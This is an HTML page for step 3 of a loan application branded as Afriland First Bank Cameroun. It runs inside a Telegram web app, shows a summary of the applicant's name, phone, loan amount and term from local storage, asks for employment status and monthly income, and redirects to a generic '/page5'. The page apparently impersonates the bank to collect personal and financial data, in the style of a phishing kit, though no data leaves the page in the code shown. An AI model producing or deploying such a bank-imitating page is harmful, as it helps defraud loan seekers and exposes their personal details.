<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Afriland First Bank - Résumé de la Demande</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-color: #551a8b; --primary-hover: #451370; --bg-color: #f3eff8; --card-bg: #ffffff; --input-border: #dcd6e4; --btn-gray: #e8e2ee; --btn-gray-text: #444; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--primary-color); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 18px; font-weight: 800; color: #fff; }
        .header-title .bank { color: #ffd700; margin-right: 4px; }
        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(85, 26, 139, 0.08); display: flex; flex-direction: column; }
        .main-title { font-size: 26px; color: #000; margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: #888; text-align: center; margin-bottom: 20px; }
        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--primary-color); }
        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; outline: none; width: 100%; background: #fff; }
        .form-control:focus { border-color: var(--primary-color); }
        .summary-card { background-color: #faf6fd; border-left: 4px solid var(--primary-color); padding: 18px 16px; border-radius: 10px; margin: 10px 0 24px; }
        .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #eadff2; }
        .summary-label { color: #666; font-size: 13.5px; }
        .summary-value { font-weight: 700; font-size: 13.5px; color: #111; }
        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
        .btn-prev { background-color: var(--btn-gray); color: var(--btn-gray-text); border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
        .btn-next { background-color: var(--primary-color); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #666; margin-top: auto; }
    </style>
</head>
<body>
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title"><span class="bank">Afriland</span> First Bank</div>
    <div class="menu-icon"><span></span><span></span><span></span></div>
</div>
<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 3 sur 3</div>
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>
    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">Statut Professionnel</label>
            <select id="jobStatus" class="form-control" required>
                <option value="Employé" selected>Employé(e)</option>
                <option value="Entrepreneur / Commerçant">Entrepreneur / Commerçant</option>
                <option value="Étudiant">Étudiant(e)</option>
                <option value="Sans emploi">Sans emploi</option>
            </select>
        </div>
        <div class="form-group">
            <label for="income">Revenu Mensuel Moyen (XAF)</label>
            <input type="number" id="income" class="form-control" placeholder="Ex: 300000" required>
        </div>
        <div class="summary-card">
            <h3>Résumé de la Demande</h3>
            <div class="summary-row"><span class="summary-label">Montant :</span><span class="summary-value" id="sumAmount">--</span></div>
            <div class="summary-row"><span class="summary-label">Durée :</span><span class="summary-value" id="sumDuration">--</span></div>
            <div class="summary-row"><span class="summary-label">Demandeur :</span><span class="summary-value" id="sumName">--</span></div>
            <div class="summary-row"><span class="summary-label">Téléphone :</span><span class="summary-value" id="sumPhone">--</span></div>
        </div>
        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">SOUMETTRE LA DEMANDE</button>
        </div>
    </form>
</div>
<div class="footer-banner">© 2026 Afriland First Bank Cameroun</div>
<script>
window.onload = () => {
    document.getElementById('sumAmount').innerText = (localStorage.getItem('appliedAmount') || '250000') + " XAF";
    document.getElementById('sumDuration').innerText = (localStorage.getItem('appliedTerm') || '12') + " Mois";
    document.getElementById('sumName').innerText = `${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}`;
    document.getElementById('sumPhone').innerText = "+237 " + (localStorage.getItem('phone') || '');
};
function submitForm(event) {
    event.preventDefault();
    localStorage.setItem('jobStatus', document.getElementById('jobStatus').value);
    localStorage.setItem('income', document.getElementById('income').value);
    window.location.href = "/page5";
}
function goBack() { window.location.href = "/page3"; }
</script>
</body>
</html>
